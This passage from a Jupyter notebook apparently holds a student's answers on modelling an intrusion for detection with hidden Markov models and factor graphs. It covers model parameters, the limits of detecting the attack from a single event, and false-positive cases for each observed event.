    "#### a. Draw an HMM model for the attack scenario given the provided states and events.\n",
    "\n",
    "Will be drawn in the final ppt.\n",
    "\n",
    "\n",
    "#### b. What parameters are needed for this HMM model to work?\n",
    "\n",
    "The state transition matrix, the observation matrix and the priors.\n",
    "\n",
    "\n",
    "#### c. Give an example of an advantage of the FG over the HMM model.\n",
    "\n",
    "The FG follows a more general approach and is not restricted by a Markov assumption like in HMMs. This allows us to include factor functions like 'r' and 'c' to include any number of relationships between nodes."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 4.0\n",
    "#### Is it possible to 100% detect this attack using only one event, e.g., ϵ1, of the six listed events? Briefly explain.\n",
    "No, it's not possible to detect this attack with 100% certainty using only one event. This is because each event has some probability of being associated with \"benign\" in the corresponding attack state, which corresponds to a legitimate user. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 4.1\n",
    "#### For each of the six listed events, give an example of a situation in which a false positive (i.e., mis-detecting a legitimate user as an attacker) could happen.\n",
    "**Scan**: The system admin is doing the scan instead of the attacker.\n",
    "\n",
    "**Login**: No false positives possible as the event maps to only one state (benign).\n",
    "\n",
    "**Sensitive URI**: Since the sensitive URI here indicates a URI pointing to an executable, false positive can be generated when a legitimate user tries to access any URI executable (not necessarily from the attacker-controlled server).\n",
    "\n",
    "**New Exe File**: Same as sensitive URI.\n",
    "\n",
    "**Homepage Overwritten with new link**: Legitimate user themselves overwrite the homepage with a new link, which does not necessarily come from the exe file donwloaded from the attacker's server.\n",
    "\n",
    "**Webserver Restarted**: Same as Homepage overwritten."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 4.2\n",
    "#### Provide a visual representation of a factor graph that can model the attack described above.\n",
    "Included in the final ppt."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 4.3\n",
    "#### What variables and factor functions are common to the factor graph in Task 3 and your factor graph in 4.2?\n",
    "The events Scan, Login and Sensitive URI are common to both factor graphs. Moreover they also map to the same states in both FGs:\n",
    "\n",
    "Scan -> {benign, discovery}\n",
    "\n",
    "Login -> {benign}\n",
    "\n",
    "Sensitive URI -> {benign, privilege escalation}\n",
    "\n",
    "(this can be seen in the f_dict dictionary for our previous FG)\n",
    "\n",
    "Thus the severity factor functions corresponsing to these states can be common (assuming that the event sequences generated in event_review.txt are sufficiently general to both attack scenarios).\n",
    "\n",
    "The above analysis is for a general scenario. **For the particular attack sequence observed**, the set \\[Scan, Login, Sensitive URI, Sensitive URI, Sensitive URI\\] is common. Thus in the particular scenario, the severity factor functions f_1 through f_5 and the repeptitive factor function \"r\" are common to both FGs."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
